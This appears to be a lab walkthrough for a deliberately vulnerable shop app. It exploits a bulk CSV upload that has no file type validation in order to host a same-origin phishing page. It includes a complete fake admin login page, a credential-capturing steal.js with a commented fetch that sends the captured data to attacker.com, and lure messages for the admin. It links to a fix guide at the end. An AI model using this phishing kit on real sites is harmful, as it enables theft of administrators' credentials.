## File Upload Vulnerability


The bulk order upload feature accepts CSV files but has **no file type validation**. Combined with serving uploads from the same domain, this allows you to upload malicious files.

---

## Step 1: Understand the Vulnerability

**What's wrong:**
- The endpoint accepts ANY file type (no `fileFilter`)
- Uploaded files are served publicly at `/uploads/`
- Files are served from the same domain as the app
- express.static serves files with correct Content-Type based on extension

**Why it's dangerous:**
- Upload `.html` file → renders in browser
- Upload `.js` file → can be loaded by uploaded HTML
- Same origin → CSP allows scripts from `/uploads/`
- Admin clicks malicious link → credentials stolen

---

## Step 2: Reconnaissance

**Find the upload endpoint:**
```
POST /api/v1/order/bulk
```

**Check if uploads are publicly accessible:**
1. Upload a normal CSV file
2. Note the filename (e.g., `orders.csv`)
3. Try visiting: `http://127.0.0.1:3000/uploads/orders.csv`
4. ✅ If you can access it → uploads are public

---

## Step 3: Create the Phishing Page

**Save this as `phishing.html`:**

```html
<!DOCTYPE html>
<html>
<head>
  <title>Session Expired - Please Log In</title>
  <style>
    body { 
      font-family: Arial, sans-serif; 
      max-width: 400px; 
      margin: 100px auto; 
      padding: 20px;
      background: #f5f5f5;
    }
    .login-box {
      background: white;
      padding: 30px;
      border-radius: 8px;
      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
    }
    input { 
      width: 100%; 
      padding: 12px; 
      margin: 10px 0; 
      box-sizing: border-box;
      border: 1px solid #ddd;
      border-radius: 4px;
    }
    button { 
      width: 100%; 
      padding: 12px; 
      background: #0066cc; 
      color: white; 
      border: none; 
      border-radius: 4px;
      cursor: pointer;
      font-size: 16px;
    }
    button:hover {
      background: #0052a3;
    }
    .logo { 
      text-align: center; 
      font-size: 24px; 
      margin-bottom: 20px;
      color: #333;
    }
    .error {
      color: #d32f2f;
      font-size: 14px;
      margin-top: 10px;
      display: none;
    }
  </style>
  <script src="steal.js"></script>
</head>
<body>
  <div class="login-box">
    <div class="logo">🔒 AnonBuy Admin</div>
    <h2 style="margin-top: 0;">Session Expired</h2>
    <p style="color: #666;">Please log in again to continue:</p>
    <form id="phishForm">
      <input type="email" id="email" placeholder="Email" required>
      <input type="password" id="password" placeholder="Password" required>
      <button type="submit">Log In</button>
      <div class="error" id="error">Invalid credentials. Please try again.</div>
    </form>
  </div>
</body>
</html>
```

---

## Step 4: Create the Credential Stealer

**Save this as `steal.js`:**

```js
function captureCredentials(email, password) {
  // In a real attack, send to attacker's server:
  // fetch('https://attacker.com/harvest', {
  //   method: 'POST',
  //   headers: { 'Content-Type': 'application/json' },
  //   body: JSON.stringify({ 
  //     email: email, 
  //     password: password,
  //     site: 'anonbuy',
  //     timestamp: new Date().toISOString()
  //   })
  // });

  // For demo: show what was captured
  document.body.innerHTML = `
    <div style="background: #fee; padding: 30px; border: 3px solid red; max-width: 600px; margin: 50px auto; border-radius: 8px;">
      <h2 style="color: #d32f2f; margin-top: 0;">⚠️ CREDENTIALS CAPTURED</h2>
      <div style="background: white; padding: 15px; border-radius: 4px; margin: 20px 0;">
        <p><strong>Email:</strong> <code>${email}</code></p>
        <p><strong>Password:</strong> <code>${password}</code></p>
      </div>
      <h3>What just happened?</h3>
      <ul style="text-align: left;">
        <li>You uploaded malicious HTML + JavaScript to the server</li>
        <li>Files were served from the same origin (<code>/uploads/</code>)</li>
        <li>CSP allowed the script because it's from <code>'self'</code></li>
        <li>Victim entered credentials → attacker now has them</li>
      </ul>
      <p><strong>In a real attack:</strong> These credentials would be sent to <code>https://attacker.com</code> and the victim would be redirected to a real page, never knowing they were compromised.</p>
    </div>
  `;
  return false;
}

window.onload = function() {
  var form = document.getElementById('phishForm');
  if (form) {
    form.onsubmit = function(e) {
      e.preventDefault();
      var email = document.getElementById('email').value;
      var password = document.getElementById('password').value;
      captureCredentials(email, password);
    };
  }
};
```

---

## Step 5: Upload Both Files

**Upload `steal.js` first:**
1. Go to the bulk upload interface
2. Select `steal.js`
3. Upload it
4. Verify: Visit `http://127.0.0.1:3000/uploads/steal.js` → should see the JavaScript code

**Upload `phishing.html` second:**
1. Select `phishing.html`
2. Upload it
3. Verify: Visit `http://127.0.0.1:3000/uploads/phishing.html` → should see the login form

---

## Step 6: Execute the Attack

**Method 1 - Direct Link (Social Engineering):**

Send the admin a message:
```
Hey, there's an issue with order processing. Can you check this report?
http://127.0.0.1:3000/uploads/phishing.html
```

**Method 2 - Hidden in Other Content:**

If the app has a messaging/notes feature, embed the link:
```html
Check this order: <a href="/uploads/phishing.html">Order #12345</a>
```

**Method 3 - Automated (if admin reviews all uploads):**

If there's an admin panel that lists all uploaded files, the admin might click your file thinking it's a legitimate order CSV.

---

## Step 7: Capture Credentials

When the admin visits `/uploads/phishing.html`:

1. They see a professional-looking login form
2. Form looks legitimate (same domain, good styling)
3. They enter their email and password
4. JavaScript captures the credentials
5. In a real attack: credentials sent to attacker's server
6. Admin is redirected to real page (they never notice)

---

## Why This Works

| Defense | Status | Why It Fails |
|---------|--------|--------------|
| **File type validation** | ❌ Missing | No `fileFilter` → accepts `.html` and `.js` |
| **CSP protection** | ⚠️ Bypassed | CSP allows `script-src 'self'` → `/uploads/steal.js` is same origin |
| **Separate upload domain** | ❌ Missing | Uploads served from main domain → same-origin policy doesn't help |
| **Content-Disposition** | ❌ Missing | Files render in browser instead of forcing download |

---

## Real-World Impact

**What attackers can do:**
- ✅ Steal admin credentials (as shown)
- ✅ Steal session cookies (if not httpOnly)
- ✅ Deploy keyloggers on admin pages
- ✅ Perform actions as the admin (CSRF)
- ✅ Exfiltrate sensitive data
- ✅ Deploy crypto miners
- ✅ Redirect to malicious sites

**Why it's critical:**
- No authentication bypass needed
- Works even with HTTPS
- Victim is on the trusted domain
- Hard to detect in logs (looks like normal file access)

---

## Testing Tips

**If it doesn't work:**
1. ✅ Check both files uploaded: `ls uploads/`
2. ✅ Visit files directly to verify they're accessible
3. ✅ Check browser console for CSP errors
4. ✅ Try in Chrome (more permissive CSP) vs Firefox
5. ✅ Verify express.static is serving `/uploads`

**If CSP blocks it:**
- Modern CSP with `script-src 'self'` should allow this
- If blocked, the app may have stricter CSP (rare)
- This is a defense that SHOULD be in place

---

## Next Steps

Now that you've exploited this vulnerability, learn how to fix it:

[Go to Fix Guide →](../fixes/file_upload.md)